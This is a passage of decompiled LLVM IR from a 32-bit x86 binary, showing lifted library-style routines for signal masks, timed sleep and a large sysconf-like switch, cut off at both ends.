  uselistorder i32* %edx.global-to-local, { 0, 7, 1, 6, 2, 3, 4, 5, 8, 10, 9 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 17, 14, 15, 16 }
  uselistorder i8 10, { 0, 1, 2, 3, 4, 9, 6, 7, 10, 8, 5 }
  uselistorder i8 48, { 0, 2, 1 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 32, { 17, 16, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 9, 13, 14, 15, 0, 10 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80535bf, { 1, 0 }
  uselistorder label %dec_label_pc_80535b7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053593, { 1, 0 }
  uselistorder label %dec_label_pc_8053550, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805353a, { 1, 0 }
  uselistorder label %dec_label_pc_8053525, { 1, 0 }
  uselistorder label %dec_label_pc_8053511, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80534ed, { 1, 0 }
  uselistorder label %dec_label_pc_80534ec, { 1, 0 }
  uselistorder label %dec_label_pc_80534cd, { 1, 0 }
}

define i32 @function_80535c9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80535c9:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_80535dc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80535dc, i32* @ebx, align 4
  %v2_80535e1 = call i32 @function_8053940(i32 %v2_80535dc, i32 134560061)
  %v1_80535ed = call i32 @function_805393d(i32 ptrtoint (i32* @global_var_80560b0.225 to i32))
  %v0_80535f2 = load i32, i32* @global_var_8056198.226, align 8
  store i32 %v0_80535f2, i32* @eax, align 4
  %v1_80535fa = icmp eq i32 %v0_80535f2, 0
  br i1 %v1_80535fa, label %dec_label_pc_8053607, label %dec_label_pc_80535fe

dec_label_pc_80535fe:                             ; preds = %dec_label_pc_80535c9
  %v0_8053601 = load i32, i32* @esi, align 4
  %v1_8053602 = call i32 @unknown_0(i32 %v0_8053601)
  store i32 %v1_8053602, i32* @eax, align 4
  br label %dec_label_pc_8053607

dec_label_pc_8053607:                             ; preds = %dec_label_pc_80535c9, %dec_label_pc_80535fe
  %v2_805360c = call i32 @function_8053940(i32 %v2_80535dc, i32 1)
  %v0_8053611 = call i32 @function_80538fe()
  %v0_805362a = load i32, i32* @esi, align 4
  %v1_805362b = call i32 @function_8053ce0(i32 %v0_805362a)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8053ce0, { 1, 0 }
  uselistorder i32 (i32)* @function_805393d, { 7, 6, 5, 4, 3, 10, 0, 1, 9, 8, 2 }
  uselistorder i32 (i32, i32)* @function_8053940, { 8, 7, 6, 5, 13, 12, 4, 0, 3, 1, 11, 10, 9, 2 }
  uselistorder label %dec_label_pc_8053607, { 1, 0 }
}

define i32 @function_8053630(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053630:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8053630 = load i32, i32* @ebp, align 4
  %v0_8053631 = load i32, i32* @edi, align 4
  %v0_8053632 = load i32, i32* @esi, align 4
  %v0_8053633 = load i32, i32* @ebx, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_8053646 = icmp eq i32 %arg1, 0
  %v1_8053648 = icmp eq i1 %v1_8053646, false
  br i1 %v1_8053648, label %dec_label_pc_805364f.lr.ph, label %dec_label_pc_80537a7

dec_label_pc_805364f.lr.ph:                       ; preds = %dec_label_pc_8053630
  %v15_8053634 = ptrtoint i32* %stack_var_-444 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805364f56 = add i32 %v15_8053634, 416
  %v5_805364f57 = inttoptr i32 %v4_805364f56 to i32*
  store i32 0, i32* %v5_805364f57, align 4
  %v0_805365a58 = load i32, i32* %eax.global-to-local, align 4
  %v1_805365a59 = add i32 %v0_805365a58, -1
  %v9_805365a60 = icmp slt i32 %v1_805365a59, 0
  store i32 %v1_805365a59, i32* %eax.global-to-local, align 4
  %v1_805365b61 = icmp eq i1 %v9_805365a60, false
  br i1 %v1_805365b61, label %dec_label_pc_805364f.dec_label_pc_805364f_crit_edge, label %dec_label_pc_805365d

dec_label_pc_805364f.dec_label_pc_805364f_crit_edge: ; preds = %dec_label_pc_805364f.lr.ph, %dec_label_pc_805364f.dec_label_pc_805364f_crit_edge
  %v1_805365a62 = phi i32 [ %v1_805365a, %dec_label_pc_805364f.dec_label_pc_805364f_crit_edge ], [ %v1_805365a59, %dec_label_pc_805364f.lr.ph ]
  %v0_805364f.pre = load i32, i32* @esp, align 4
  %v2_805364f = mul i32 %v1_805365a62, 4
  %v3_805364f = add i32 %v0_805364f.pre, 292
  %v4_805364f = add i32 %v3_805364f, %v2_805364f
  %v5_805364f = inttoptr i32 %v4_805364f to i32*
  store i32 0, i32* %v5_805364f, align 4
  %v0_805365a = load i32, i32* %eax.global-to-local, align 4
  %v1_805365a = add i32 %v0_805365a, -1
  %v9_805365a = icmp slt i32 %v1_805365a, 0
  store i32 %v1_805365a, i32* %eax.global-to-local, align 4
  %v1_805365b = icmp eq i1 %v9_805365a, false
  br i1 %v1_805365b, label %dec_label_pc_805364f.dec_label_pc_805364f_crit_edge, label %dec_label_pc_805365d

dec_label_pc_805365d:                             ; preds = %dec_label_pc_805364f.dec_label_pc_805364f_crit_edge, %dec_label_pc_805364f.lr.ph
  %v1_805365a.lcssa = phi i32 [ %v1_805365a59, %dec_label_pc_805364f.lr.ph ], [ %v1_805365a, %dec_label_pc_805364f.dec_label_pc_805364f_crit_edge ]
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8053673 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8053673, i32* @ebx, align 4
  store i32 %v2_8053673, i32* %stack_var_-460, align 4
  %v4_805367b = call i32 @function_80523ce(i32 %v2_8053673, i32 17, i32 %v1_805365a.lcssa, i32 %v1_805365a.lcssa)
  store i32 %v4_805367b, i32* %eax.global-to-local, align 4
  %v2_8053683 = icmp slt i32 %v4_805367b, 0
  br i1 %v2_8053683, label %dec_label_pc_80537ab, label %dec_label_pc_805368b

dec_label_pc_805368b:                             ; preds = %dec_label_pc_805365d
  %v2_805368c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_805368c, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8053697 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8053697 = call i32 @function_8051ced(i32 0, %_TYPEDEF_sigset_t* %v3_8053697, i32 %v2_805368c)
  store i32 %v4_8053697, i32* %eax.global-to-local, align 4
  %v1_805369f = icmp eq i32 %v4_8053697, 0
  %v1_80536a1 = icmp eq i1 %v1_805369f, false
  br i1 %v1_80536a1, label %dec_label_pc_80537ab, label %dec_label_pc_80536a7

dec_label_pc_80536a7:                             ; preds = %dec_label_pc_805368b
  store i32 %v2_805368c, i32* %stack_var_-460, align 4
  %v4_80536ac = call i32 @function_80523aa(i32 %v2_805368c, i32 17, i32 %v4_8053697, i32 %v4_8053697)
  store i32 %v4_80536ac, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80536b9 = icmp eq i32 %v4_80536ac, 0
  br i1 %v1_80536b9, label %dec_label_pc_80536c2.lr.ph, label %dec_label_pc_8053775

dec_label_pc_80536c2.lr.ph:                       ; preds = %dec_label_pc_80536a7
  store i32 31, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v5_805364f57, align 4
  %v0_80536cd50 = load i32, i32* %edx.global-to-local, align 4
  %v1_80536cd51 = add i32 %v0_80536cd50, -1
  %v9_80536cd52 = icmp slt i32 %v1_80536cd51, 0
  store i32 %v1_80536cd51, i32* %edx.global-to-local, align 4
  %v1_80536ce53 = icmp eq i1 %v9_80536cd52, false
  br i1 %v1_80536ce53, label %dec_label_pc_80536c2.dec_label_pc_80536c2_crit_edge, label %dec_label_pc_80536d0

dec_label_pc_80536c2.dec_label_pc_80536c2_crit_edge: ; preds = %dec_label_pc_80536c2.lr.ph, %dec_label_pc_80536c2.dec_label_pc_80536c2_crit_edge
  %v1_80536cd54 = phi i32 [ %v1_80536cd, %dec_label_pc_80536c2.dec_label_pc_80536c2_crit_edge ], [ %v1_80536cd51, %dec_label_pc_80536c2.lr.ph ]
  %v0_80536c2.pre = load i32, i32* @esp, align 4
  %v2_80536c2 = mul i32 %v1_80536cd54, 4
  %v3_80536c2 = add i32 %v0_80536c2.pre, 292
  %v4_80536c2 = add i32 %v3_80536c2, %v2_80536c2
  %v5_80536c2 = inttoptr i32 %v4_80536c2 to i32*
  store i32 0, i32* %v5_80536c2, align 4
  %v0_80536cd = load i32, i32* %edx.global-to-local, align 4
  %v1_80536cd = add i32 %v0_80536cd, -1
  %v9_80536cd = icmp slt i32 %v1_80536cd, 0
  store i32 %v1_80536cd, i32* %edx.global-to-local, align 4
  %v1_80536ce = icmp eq i1 %v9_80536cd, false
  br i1 %v1_80536ce, label %dec_label_pc_80536c2.dec_label_pc_80536c2_crit_edge, label %dec_label_pc_80536d0

dec_label_pc_80536d0:                             ; preds = %dec_label_pc_80536c2.dec_label_pc_80536c2_crit_edge, %dec_label_pc_80536c2.lr.ph
  store i32 %v2_8053673, i32* %eax.global-to-local, align 4
  store i32 %v2_8053673, i32* %stack_var_-460, align 4
  %v4_80536dc = call i32 @function_80523ce(i32 %v2_8053673, i32 17, i32 0, i32 0)
  store i32 %v4_80536dc, i32* %eax.global-to-local, align 4
  %v2_80536e4 = icmp slt i32 %v4_80536dc, 0
  br i1 %v2_80536e4, label %dec_label_pc_80537ab, label %dec_label_pc_80536ec

dec_label_pc_80536ec:                             ; preds = %dec_label_pc_80536d0
  %v2_80536ed = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_80536ed, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_80536f6 = call i32 @function_8053b7f(i32 17, i32* null, i32 %v2_80536ed)
  store i32 %v4_80536f6, i32* %eax.global-to-local, align 4
  %v2_80536fe = icmp slt i32 %v4_80536f6, 0
  %v1_8053700 = icmp eq i1 %v2_80536fe, false
  br i1 %v1_8053700, label %dec_label_pc_805372a, label %dec_label_pc_8053702

dec_label_pc_8053702:                             ; preds = %dec_label_pc_80536ec
  %v0_8053702 = load i32, i32* %stack_var_-460, align 4
  %v1_8053702 = call i32 @function_8051fb9(i32 %v0_8053702)
  store i32 %v1_8053702, i32* %eax.global-to-local, align 4
  store i32 %v1_8053702, i32* @ebx, align 4
  %v1_8053709 = inttoptr i32 %v1_8053702 to i32*
  %v2_8053709 = load i32, i32* %v1_8053709, align 4
  store i32 %v2_8053709, i32* @esi, align 4
  store i32 %v2_805368c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053718 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053718 = call i32 @function_8051ced(i32 2, %_TYPEDEF_sigset_t* %v3_8053718, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8053723 = load i32, i32* @esi, align 4
  %v1_8053723 = load i32, i32* @ebx, align 4
  %v2_8053723 = inttoptr i32 %v1_8053723 to i32*
  store i32 %v0_8053723, i32* %v2_8053723, align 4
  %v0_80537b8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80537ae

dec_label_pc_805372a:                             ; preds = %dec_label_pc_80536ec
  %v3_805372a = load i32, i32* %stack_var_-420, align 4
  %v12_805372a = icmp eq i32 %v3_805372a, 1
  %v2_8053736 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053736, i32* @ebx, align 4
  %v1_805373d = icmp eq i1 %v12_805372a, false
  br i1 %v1_805373d, label %dec_label_pc_8053764, label %dec_label_pc_805373f

dec_label_pc_805373f:                             ; preds = %dec_label_pc_805372a
  %v0_805373f = load i32, i32* @edi, align 4
  store i32 %v2_8053736, i32* %stack_var_-460, align 4
  %v4_8053743 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8053743 = call i32 @function_80540d7(%timespec* %v4_8053743, i32 %v2_8053736, i32 %v0_805373f, i32 %v0_805373f)
  store i32 %v5_8053743, i32* %eax.global-to-local, align 4
  store i32 %v5_8053743, i32* @edi, align 4
  %v1_805374a = call i32 @function_8051fb9(i32 %v2_8053736)
  store i32 %v1_805374a, i32* %eax.global-to-local, align 4
  store i32 %v1_805374a, i32* @ebx, align 4
  %v1_8053754 = inttoptr i32 %v1_805374a to i32*
  %v2_8053754 = load i32, i32* %v1_8053754, align 4
  store i32 %v2_8053754, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805375b = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_805375b = call i32 @function_8051ced(i32 2, %_TYPEDEF_sigset_t* %v3_805375b, i32 0)
  store i32 %v4_805375b, i32* %eax.global-to-local, align 4
  %v0_8053760 = load i32, i32* @esi, align 4
  %v1_8053760 = load i32, i32* @ebx, align 4
  %v2_8053760 = inttoptr i32 %v1_8053760 to i32*
  store i32 %v0_8053760, i32* %v2_8053760, align 4
  %v0_805378a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053787

dec_label_pc_8053764:                             ; preds = %dec_label_pc_805372a
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805376a = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_805376a = call i32 @function_8051ced(i32 2, %_TYPEDEF_sigset_t* %v3_805376a, i32 0)
  store i32 %v4_805376a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053780

dec_label_pc_8053775:                             ; preds = %dec_label_pc_80536a7
  %v2_8053777 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053777, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053780

dec_label_pc_8053780:                             ; preds = %dec_label_pc_8053764, %dec_label_pc_8053775
  %storemerge3.pre-phi = phi i32 [ %v2_8053736, %dec_label_pc_8053764 ], [ %v2_8053777, %dec_label_pc_8053775 ]
  %v3_8053780 = phi i32 [ %v2_805368c, %dec_label_pc_8053764 ], [ %v4_80536ac, %dec_label_pc_8053775 ]
  %v2_8053780 = phi i32 [ 0, %dec_label_pc_8053764 ], [ %v4_80536ac, %dec_label_pc_8053775 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_8053780 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8053780 = call i32 @function_80540d7(%timespec* %v4_8053780, i32 %storemerge3.pre-phi, i32 %v2_8053780, i32 %v3_8053780)
  store i32 %v5_8053780, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053787

dec_label_pc_8053787:                             ; preds = %dec_label_pc_805373f, %dec_label_pc_8053780
  %v0_805378a = phi i32 [ %v0_805378a.pre, %dec_label_pc_805373f ], [ %v5_8053780, %dec_label_pc_8053780 ]
  %v1_805378a = icmp eq i32 %v0_805378a, 0
  br i1 %v1_805378a, label %dec_label_pc_80537a7, label %dec_label_pc_805378e

dec_label_pc_805378e:                             ; preds = %dec_label_pc_8053787
  %v4_805379e = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_805379e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80537ae

dec_label_pc_80537a7:                             ; preds = %dec_label_pc_8053630, %dec_label_pc_8053787
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80537ae

dec_label_pc_80537ab:                             ; preds = %dec_label_pc_80536d0, %dec_label_pc_805368b, %dec_label_pc_805365d
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80537ae

dec_label_pc_80537ae:                             ; preds = %dec_label_pc_80537a7, %dec_label_pc_805378e, %dec_label_pc_8053702, %dec_label_pc_80537ab
  %v0_80537b8 = phi i32 [ 0, %dec_label_pc_80537a7 ], [ %v4_805379e, %dec_label_pc_805378e ], [ %v0_80537b8.pre, %dec_label_pc_8053702 ], [ -1, %dec_label_pc_80537ab ]
  store i32 %v0_8053633, i32* @ebx, align 4
  store i32 %v0_8053632, i32* @esi, align 4
  store i32 %v0_8053631, i32* @edi, align 4
  store i32 %v0_8053630, i32* @ebp, align 4
  ret i32 %v0_80537b8

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_805374a, { 1, 0, 2 }
  uselistorder i32 %v2_8053736, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_80536cd, { 2, 1, 0 }
  uselistorder i32 %v4_80536ac, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805368c, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_8053673, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_805365a, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 5, 6, 0, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 0, 1, 23 }
  uselistorder i32 (i32, i32*, i32)* @function_8053b7f, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_80523ce, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80537ae, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80537a7, { 1, 0 }
  uselistorder label %dec_label_pc_8053787, { 1, 0 }
  uselistorder label %dec_label_pc_8053780, { 1, 0 }
  uselistorder label %dec_label_pc_80536c2.dec_label_pc_80536c2_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_805364f.dec_label_pc_805364f_crit_edge, { 1, 0 }
}

define i32 @function_80537b9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80537b9:
  switch i32 %arg1, label %dec_label_pc_80537d8 [
    i32 0, label %dec_label_pc_80537e8
    i32 1, label %dec_label_pc_80538cd
    i32 2, label %dec_label_pc_80537f2
    i32 3, label %dec_label_pc_80537fc
    i32 4, label %dec_label_pc_8053806
    i32 5, label %dec_label_pc_805389c
    i32 6, label %dec_label_pc_805380e
    i32 7, label %dec_label_pc_80537ce
    i32 8, label %dec_label_pc_80537ce
    i32 9, label %dec_label_pc_80537ce
    i32 10, label %dec_label_pc_80537ce
    i32 11, label %dec_label_pc_80537ce
    i32 12, label %dec_label_pc_80537ce
    i32 13, label %dec_label_pc_80537ce
    i32 14, label %dec_label_pc_80537ce
    i32 15, label %dec_label_pc_80537ce
    i32 16, label %dec_label_pc_80537ce
    i32 17, label %dec_label_pc_80537ce
    i32 18, label %dec_label_pc_80537ce
    i32 19, label %dec_label_pc_80537ce
    i32 20, label %dec_label_pc_80537ce
    i32 21, label %dec_label_pc_80537ce
    i32 22, label %dec_label_pc_80537ce
    i32 23, label %dec_label_pc_80538cd
    i32 24, label %dec_label_pc_80538cd
    i32 25, label %dec_label_pc_80538d9
    i32 26, label %dec_label_pc_80538aa
    i32 27, label %dec_label_pc_80538cd
    i32 28, label %dec_label_pc_8053820
    i32 29, label %dec_label_pc_80538a3
    i32 30, label %dec_label_pc_8053818
    i32 31, label %dec_label_pc_80538b8
    i32 32, label %dec_label_pc_80538cd
    i32 33, label %dec_label_pc_80538cd
    i32 34, label %dec_label_pc_80538cd
    i32 35, label %dec_label_pc_80538b1
    i32 36, label %dec_label_pc_80538e0
    i32 37, label %dec_label_pc_80538e7
    i32 38, label %dec_label_pc_80538e0
    i32 39, label %dec_label_pc_805382a
    i32 40, label %dec_label_pc_80538ee
    i32 41, label %dec_label_pc_80538cd
    i32 42, label %dec_label_pc_80538b8
    i32 43, label %dec_label_pc_80538e7
    i32 44, label %dec_label_pc_80538f5
    i32 45, label %dec_label_pc_80538e7
    i32 46, label %dec_label_pc_80538a3
    i32 47, label %dec_label_pc_80538a3
    i32 48, label %dec_label_pc_80538a3
    i32 49, label %dec_label_pc_80538cd
    i32 50, label %dec_label_pc_80538cd
    i32 51, label %dec_label_pc_80538a3
    i32 52, label %dec_label_pc_80538a3
    i32 53, label %dec_label_pc_80538cd
    i32 54, label %dec_label_pc_80538cd
    i32 55, label %dec_label_pc_80538cd
    i32 56, label %dec_label_pc_80538cd
    i32 57, label %dec_label_pc_80538cd
    i32 58, label %dec_label_pc_80538cd
    i32 59, label %dec_label_pc_80538cd
    i32 60, label %dec_label_pc_80538cd
    i32 61, label %dec_label_pc_80538cd
    i32 62, label %dec_label_pc_80538cd
    i32 63, label %dec_label_pc_80538cd
    i32 64, label %dec_label_pc_80538cd
    i32 65, label %dec_label_pc_80538cd
    i32 66, label %dec_label_pc_80538cd
    i32 67, label %dec_label_pc_80537ce
    i32 68, label %dec_label_pc_80537ce
    i32 69, label %dec_label_pc_80538b1
    i32 70, label %dec_label_pc_80538b1
    i32 71, label %dec_label_pc_80538b1
    i32 72, label %dec_label_pc_80538b8
    i32 73, label %dec_label_pc_80538bf
    i32 74, label %dec_label_pc_80538c6
    i32 75, label %dec_label_pc_8053834
    i32 76, label %dec_label_pc_80538c6
    i32 77, label %dec_label_pc_80537ce
    i32 78, label %dec_label_pc_80537ce
    i32 79, label %dec_label_pc_80537ce
    i32 80, label %dec_label_pc_80537ce
    i32 81, label %dec_label_pc_80537ce
    i32 82, label %dec_label_pc_80537ce
    i32 83, label %dec_label_pc_80537ce
    i32 84, label %dec_label_pc_80537ce
    i32 85, label %dec_label_pc_80538cd
    i32 86, label %dec_label_pc_80538cd
    i32 87, label %dec_label_pc_80538aa
    i32 88, label %dec_label_pc_805383e
    i32 89, label %dec_label_pc_8053848
    i32 90, label %dec_label_pc_80538bf
    i32 91, label %dec_label_pc_80537ce
    i32 92, label %dec_label_pc_80537ce
    i32 93, label %dec_label_pc_80537ce
    i32 94, label %dec_label_pc_80537ce
    i32 95, label %dec_label_pc_80538a3
    i32 96, label %dec_label_pc_80538cd
    i32 97, label %dec_label_pc_80538cd
    i32 98, label %dec_label_pc_80537ce
    i32 99, label %dec_label_pc_80537ce
    i32 100, label %dec_label_pc_80537ce
    i32 101, label %dec_label_pc_8053852
    i32 102, label %dec_label_pc_8053895
    i32 103, label %dec_label_pc_80538d2
    i32 104, label %dec_label_pc_80538aa
    i32 105, label %dec_label_pc_805385c
    i32 106, label %dec_label_pc_80538b8
    i32 107, label %dec_label_pc_80538b8
    i32 108, label %dec_label_pc_805389c
    i32 109, label %dec_label_pc_80538d9
    i32 110, label %dec_label_pc_80538f5
    i32 111, label %dec_label_pc_8053895
    i32 112, label %dec_label_pc_80538d2
    i32 113, label %dec_label_pc_80538f5
    i32 114, label %dec_label_pc_8053866
    i32 115, label %dec_label_pc_80538ee
    i32 116, label %dec_label_pc_80538cd
    i32 117, label %dec_label_pc_80538cd
    i32 118, label %dec_label_pc_8053870
    i32 119, label %dec_label_pc_805387a
    i32 120, label %dec_label_pc_80538e7
    i32 121, label %dec_label_pc_80538aa
    i32 122, label %dec_label_pc_80538aa
    i32 123, label %dec_label_pc_80538aa
    i32 124, label %dec_label_pc_80538aa
    i32 125, label %dec_label_pc_80537ce
    i32 126, label %dec_label_pc_80537ce
    i32 127, label %dec_label_pc_80538cd
    i32 128, label %dec_label_pc_80538cd
    i32 129, label %dec_label_pc_80537ce
    i32 130, label %dec_label_pc_80537ce
    i32 131, label %dec_label_pc_80538cd
    i32 149, label %dec_label_pc_8053881
  ]

dec_label_pc_80537ce:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80537d8:                             ; preds = %dec_label_pc_80537b9
  %v1_80537d8 = call i32 @function_8051fb9(i32 ptrtoint (i32* @0 to i32))
  %v1_80537dd = inttoptr i32 %v1_80537d8 to i32*
  store i32 22, i32* %v1_80537dd, align 4
  br label %dec_label_pc_80538cd

dec_label_pc_80537e8:                             ; preds = %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80537f2:                             ; preds = %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80537fc:                             ; preds = %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_8053806:                             ; preds = %dec_label_pc_80537b9
  %v0_8053809 = call i32 @function_8053f05()
  br label %dec_label_pc_805380e

dec_label_pc_805380e:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_8053806
  br label %dec_label_pc_80538fa

dec_label_pc_8053818:                             ; preds = %dec_label_pc_80537b9
  %v0_805381b = call i32 @function_8053f9c()
  br label %dec_label_pc_8053820

dec_label_pc_8053820:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_8053818
  br label %dec_label_pc_80538fa

dec_label_pc_805382a:                             ; preds = %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_8053834:                             ; preds = %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_805383e:                             ; preds = %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_8053848:                             ; preds = %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_8053852:                             ; preds = %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_805385c:                             ; preds = %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_8053866:                             ; preds = %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_8053870:                             ; preds = %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_805387a:                             ; preds = %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_8053881:                             ; preds = %dec_label_pc_80537b9
  %v5_8053887 = call i32 @function_8053d08(i32 1, %timespec* null, i32 149, i32 149)
  %v2_805388f = icmp slt i32 %v5_8053887, 0
  %v1_8053891 = icmp eq i1 %v2_805388f, false
  br i1 %v1_8053891, label %dec_label_pc_80538a3, label %dec_label_pc_80538cd

dec_label_pc_8053895:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_805389c:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80538a3:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_8053881
  br label %dec_label_pc_80538fa

dec_label_pc_80538aa:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80538b1:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80538b8:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80538bf:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80538c6:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

